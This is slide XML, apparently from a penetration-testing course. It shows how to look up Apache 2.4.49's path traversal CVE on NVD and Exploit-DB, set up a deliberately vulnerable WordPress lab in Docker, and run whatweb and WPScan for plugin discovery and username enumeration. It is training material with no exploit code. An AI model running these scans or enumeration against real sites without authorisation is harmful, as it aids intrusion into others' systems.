              <a:rPr lang="en-US" altLang="en-US" sz="1700" baseline="0" dirty="0" smtClean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utput</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" smtClean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 from the previous step check all the versions, </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A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This shows that exploit scripts are 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available.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 smtClean="0"/>
              <a:t>Step3 — Research on NVD</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0" smtClean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 smtClean="0"/>
              <a:t>After </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>identifying a service version, search it on  NVD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Example service version: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Apache httpd 2.4.49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Search on NVD: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Apache 2.4.49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Example vulnerability found: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CVE-2021-41773</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Apache HTTP Server 2.4.49 Path Traversal Vulnerability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From the NVD page, look for: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US" sz="1700" b="1" dirty="0"/>
              <a:t>CVE ID</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>Vulnerability description</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>Severity (CVSS score)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 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" defTabSz="914400">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buNone/>
            </a:pP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lang="en-US" altLang="en-US" sz="1700" dirty="0"/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00" y="2498180"/>
            <a:ext cx="5240060" cy="424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39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2365" y="8272"/>
            <a:ext cx="12518735" cy="696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Step 4 — Research on Exploit-DB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5B4"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Take the same service version or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85B4"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>CVE 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5B4"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> found on NVD and search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5B4"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>it on Exploit-DB.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5B4"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Example service: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85B4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</a:rPr>
              <a:t>Apache httpd 2.4.49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</a:rPr>
              <a:t>Search on Exploit-DB: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9F2EA2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</a:rPr>
              <a:t>Apache 2.4.49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</a:rPr>
              <a:t>or search using the CVE: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9F2EA2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</a:rPr>
              <a:t>CVE-2021-41773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</a:rPr>
              <a:t>Example result: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9F2EA2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</a:rPr>
              <a:t>Apache HTTP Server 2.4.49 – Path Traversal / Remote Code Execution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 Unicode MS"/>
              </a:rPr>
              <a:t>Exploit-DB ID: 50383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</a:rPr>
              <a:t>This confirms that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" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>public exploit code exists for that vulnerability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F2EA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9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12594935" cy="685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Step 5 — Research on Exploit-DB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9F2EA2"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Take the same service version or the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>CVE ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> found on NVD and search it on Exploit-DB.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3DD818"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Example service:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="3DD818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  <a:t>Apache </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>httpd</a:t>
            </a:r>
            <a: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  <a:t> 2.4.49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</a:rPr>
              <a:t>Search on Exploit-DB:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="9F2EA2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  <a:t>Apache 2.4.49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</a:rPr>
              <a:t>or search using the CVE:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="9F2EA2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  <a:t>CVE-2021-41773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</a:rPr>
              <a:t>Example result:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="9F2EA2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  <a:t>Apache HTTP Server 2.4.49 – Path Traversal / Remote Code Execution</a:t>
            </a:r>
            <a:b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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>Exploit-DB ID: 50383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This confirms that </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US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public exploit code exists for that vulnerability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rgbClr val="26870F"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Purpose of This Step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002060"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>The purpose is to determine </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>whether a vulnerability can realistically lead to system compromise</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="002060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147E14"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>   Instead of focusing on every vulnerability, the focus should be on those that can provide:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="147E14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00B0F0"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>initial system access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solidFill>
                  <a:srgbClr val="8F3162"/>
                </a:solidFill>
              </a:rPr>
              <a:t>These are the vulnerabilities most useful for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="8F3162"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>real-world exploitation scenarios</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="8F3162"/>
                </a:solidFill>
                <a:latin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8F316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16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0"/>
            <a:ext cx="8610600" cy="738582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Task 03: CMS Vulnerability Scanning (WordPress/Joomla)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738582"/>
            <a:ext cx="10820400" cy="5043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7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>● Description: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Identify weaknesses specific to CMS platforms. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="19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900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>● </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Technical Requirements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1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900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="401967"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="401967"/>
                </a:solidFill>
              </a:rPr>
              <a:t>○ Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="401967"/>
                </a:solidFill>
              </a:rPr>
              <a:t>WPScan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="401967"/>
                </a:solidFill>
              </a:rPr>
              <a:t> on a WordPress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="401967"/>
                </a:solidFill>
              </a:rPr>
              <a:t>target </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="401967"/>
                </a:solidFill>
              </a:rPr>
              <a:t>to identify vulnerable </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="401967"/>
                </a:solidFill>
              </a:rPr>
              <a:t>plugins</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="401967"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="401967"/>
                </a:solidFill>
              </a:rPr>
              <a:t>and Username </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="401967"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Enumeration .</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="401967"/>
                </a:solidFill>
              </a:rPr>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="401967"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Use JoomScan if the target is running Joomla. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="401967"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="401967"/>
                </a:solidFill>
              </a:rPr>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="401967"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Look for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="401967"/>
                </a:solidFill>
              </a:rPr>
              <a:t>outdated </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="401967"/>
                </a:solidFill>
              </a:rPr>
              <a:t>plugins that are common entry points</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="401967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900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="401967"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="401967"/>
                </a:solidFill>
              </a:rPr>
              <a:t>● Learning Goal: Understand that third-party plugins are often </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="401967"/>
                </a:solidFill>
              </a:rPr>
              <a:t>the</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="401967"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="401967"/>
                </a:solidFill>
              </a:rPr>
              <a:t>weakest link. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2718468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71" y="1828800"/>
            <a:ext cx="11422116" cy="110308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Task 3 Target:- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sv-SE" altLang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sv-SE" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>://github.com/wpscanteam/VulnerableWordPress.git</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sv-SE" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="sv-SE" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD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80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11658600" cy="6426200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="1000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000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lnSpc>
                <a:spcPct val="1000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="20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CMS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Vulnerability Scanning (WordPress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="20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)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="1000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A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7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CMS vulnerability scanning focuses on finding weaknesses in popular content management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7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> systems like WordPress and Joomla, especially in themes, plugins, and misconfigurations. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>WPScan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is a specialized tool designed to detect WordPress vulnerabilities.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="1000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0"/>
              </a:solidFill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1 Install a Vulnerable WordPress Lab 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WPScan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+ Vulnerable WordPress Environment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 popular training target is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WPScan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Vulnerable WordPress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which contains outdated plugins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and themes for testing.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Download it from the official repository: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It runs using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="20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Docker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, and it creates a WordPress site with intentionally vulnerable plugins.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So we need to install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docker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 first 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sv-SE" altLang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="8F3162"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>sudo apt install docker-cli &amp;&amp; sudo apt install podman-docker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6831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401550" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr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STEP 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git clone </a:t>
            </a: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  <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://github.com/wpscanteam/VulnerableWordPress.git</a:t>
            </a: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cd VulnerableWordPress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Step 2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" smtClean="0"/>
              <a:t>Remove the Old Container if already running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docker ps -a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You will likely see something like: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CONTAINER ID   IMAGE                     NAMES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a49e970756b6   vulnerablewordpress       vulnerablewordpress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Remove it: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docker rm vulnerablewordpress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Step 3 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" smtClean="0"/>
              <a:t>Build the Image</a:t>
            </a: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docker build -t vulnerablewordpress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sv-SE" altLang="en-US" sz="1700" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> 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sv-SE" altLang="en-US" sz="17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lang="sv-SE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 is important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v-SE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err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>docker</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> run -d -p 80:80 -p 3306:3306 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>vulnerablewordpress</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="CE5DD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 smtClean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smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Then open:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0" smtClean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smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://localhost:8000</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> in browser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smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="8F51E9"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Now you have a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="8F51E9"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>WordPress target for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="8F51E9"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>WPScan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="8F51E9"/>
                </a:solidFill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Do the steps of the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="17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wordpress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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 and then login with the password you gave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Then we will need to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" smtClean="0"/>
              <a:t>identify vulnerable plugins and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0" smtClean="0"/>
              <a:t>Username Enumeration</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" smtClean="0"/>
              <a:t>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s-ES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7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700" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A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741" y="2640119"/>
            <a:ext cx="8511809" cy="1969981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85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806" y="0"/>
            <a:ext cx="11514679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Step </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>1 — Identify the CMS Running on the Target</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Before scanning, determine which CMS the website uses.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7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>whatweb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  <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>target-site.com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</a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="7030A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Example output</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2100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200" dirty="0" smtClean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rgbClr val="005D7E"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>WordPress </a:t>
            </a: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5.8 detected</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="005D7E"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
            </a:b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Apache server</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="005D7E"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
            </a:b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PHP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="005D7E"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>detected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0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>This tells you</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>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which scanning tool to use next</a:t>
            </a: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/>
              <a:t>If the target is running WordPress, use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>WPScan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> to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identify </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>vulnerabilities.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>wpscan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> --version</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>If missing: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sudo apt install </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>wpscan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/>
              <a:t>Basic Scan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7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>wpscan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> --</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>url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s-ES" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>127.0.0.1:8080</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent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3008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424229" cy="79393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Enumerate usernames:-</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
